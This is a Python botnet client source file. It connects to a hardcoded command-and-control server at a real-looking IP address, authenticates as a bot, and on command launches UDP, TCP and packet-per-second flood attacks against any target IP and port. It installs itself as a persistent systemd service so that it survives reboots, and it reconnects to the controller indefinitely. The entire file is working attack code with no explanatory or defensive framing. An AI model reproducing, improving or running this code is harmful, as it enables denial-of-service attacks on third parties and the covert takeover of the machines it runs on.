import socket, threading, time, random, requests, os
from pathlib import Path

C2_ADDRESS  = "87.106.232.239"
C2_PORT     = 2045


def generate_random_payload(size):
    return bytes(random.getrandbits(8) for _ in range(size))

def attack_udp(ip, port, end_time, size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        while time.time() < end_time:
            data = os.urandom(size)
            s.sendto(data, (ip, dport))
    finally:
        s.close()


def attack_udp_gbps(ip, port, end_time, size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        while time.time() < end_time:
            data = os.urandom(size)
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
    finally:
        s.close()


def attack_udp_bypass(ip, port, end_time, size):    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        while time.time() < end_time:
            data = generate_random_payload(size)
            s.sendto(data, (ip, dport))
    finally:
        s.close()


def attack_tcp(ip, port, end_time, size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        while time.time() < end_time:
            data = os.urandom(size)
            s.sendto(data, (ip, port))
    finally:
        s.close()


def attack_tcp_bypass(ip, port, end_time, size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        while time.time() < end_time:
            data = generate_random_payload(size)
            s.sendto(data, (ip, port))
    finally:
        s.close()

def attack_pps(ip, port, end_time, size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = b' ' * 64 
        while time.time() < end_time:
            s.sendto(data, (ip, dport))
    finally:
        s.close()



def attack_home_hold(ip, port, end_time, size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        while time.time() < end_time:
            data = os.urandom(size)
            s.sendto(data, (ip, dport))
    finally:
        s.close()

def attack_home_kill(ip, port, end_time, size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        while time.time() < end_time:
            data = os.urandom(size)
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
    finally:
        s.close()


def main():
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        while 1:
            try:
                c2.connect((C2_ADDRESS, C2_PORT))
                while 1:
                    c2.send('669787761736865726500'.encode())
                    break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send('BOT'.encode())
                        break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        break
                break
            except:
                time.sleep(5)
        while 1:
            try:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].upper()

                if command == '!UDP-RAW':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 1

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!UDP-BYPASS':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 1400
                    threads = 1

                    for _ in range(threads):
                        threading.Thread(target=attack_udp_bypass, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!UDP-GBPS':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 1

                    for _ in range(threads):
                        threading.Thread(target=attack_udp_gbps, args=(ip, port, end_time, size), daemon=True).start()
                

                if command == '!TCP-RAW':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 1

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!TCP-BYPASS':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 1400
                    threads = 1

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp_bypass, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!ALL-BYPASS':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 1400
                    threads = 1

                    for _ in range(threads):
                        threading.Thread(target=attack_udp_bypass, args=(ip, port, end_time, size), daemon=True).start()
                        threading.Thread(target=attack_tcp_bypass, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!HOME-HOLD':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 1

                    for _ in range(threads):
                        threading.Thread(target=attack_home_hold, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!HOME-KILL':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 1

                    for _ in range(threads):
                        threading.Thread(target=attack_home_kill, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!PPS-RAW':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 1
                    for _ in range(threads):
                        threading.Thread(target=attack_pps, args=(ip, port, end_time, size), daemon=True).start()
                elif command == 'PING':
                    c2.send('PONG'.encode())
            except:
                break
        c2.close()

        main()



def check_internet_connection():
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False



def create_systemd_service():
    service_content = """
    [Unit]
    Description=Bot Service
    After=network.target

    [Service]
    Type=simple
    ExecStart=/usr/bin/python3 {script_path}
    Restart=always
    User={user}
    WorkingDirectory={working_directory}

    [Install]
    WantedBy=multi-user.target
    """.format(
        script_path=Path(__file__).resolve(),
        user=os.getlogin(),
        working_directory=Path(__file__).parent.resolve()
    )

    service_file_path = "/etc/systemd/system/bot.service"
    if not Path(service_file_path).exists():
        try:
            with open(service_file_path, 'w') as service_file:
                service_file.write(service_content)
            os.system("systemctl daemon-reload")
            os.system("systemctl enable bot.service")
            os.system("systemctl start bot.service")
        except Exception as e:
            return
    else:
        return

if __name__ == '__main__':
    create_systemd_service()
    while True:
        if check_internet_connection():
            main()
        else:
            time.sleep(5)
